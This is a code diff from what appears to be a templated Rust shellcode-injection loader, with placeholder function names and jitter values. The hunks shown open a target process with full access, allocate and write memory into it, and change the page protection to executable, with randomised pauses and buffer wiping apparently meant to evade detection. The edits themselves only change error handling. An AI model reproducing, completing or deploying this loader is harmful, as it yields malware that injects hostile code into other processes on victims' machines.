@@ -117,7 +117,7 @@ fn {{FN_INJECT}}(mut buf: Vec<u8>, tar: usize) {
             PROCESS_ALL_ACCESS,
             &mut oa as *mut OBJECT_ATTRIBUTES,
             &mut ci as *mut CLIENT_ID
-        ).unwrap_or(-1);
+        ).unwrap() as i32;
         if !nt_success(s) { return; }
 
         {{FN_PAUSE}}({{JITTER_1}});
@@ -132,7 +132,7 @@ fn {{FN_INJECT}}(mut buf: Vec<u8>, tar: usize) {
             &mut size as *mut usize,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
-        ).unwrap_or(-1);
+        ).unwrap() as i32;
         if !nt_success(s) { return; }
 
         {{FN_PAUSE}}({{JITTER_2}});
@@ -146,7 +146,7 @@ fn {{FN_INJECT}}(mut buf: Vec<u8>, tar: usize) {
             buf.as_mut_ptr() as *mut c_void,
             buf_len,
             &mut written as *mut usize
-        ).unwrap_or(-1);
+        ).unwrap() as i32;
         if !nt_success(s) { return; }
 
         wipe(&mut buf);
@@ -161,7 +161,7 @@ fn {{FN_INJECT}}(mut buf: Vec<u8>, tar: usize) {
             &mut psize as *mut usize,
             PAGE_EXECUTE_READ,
             &mut old_perms as *mut u32
-        ).unwrap_or(-1);
+        ).unwrap() as i32;
         if !nt_success(s) { return; }
 
         {{FN_PAUSE}}({{JITTER_4}});
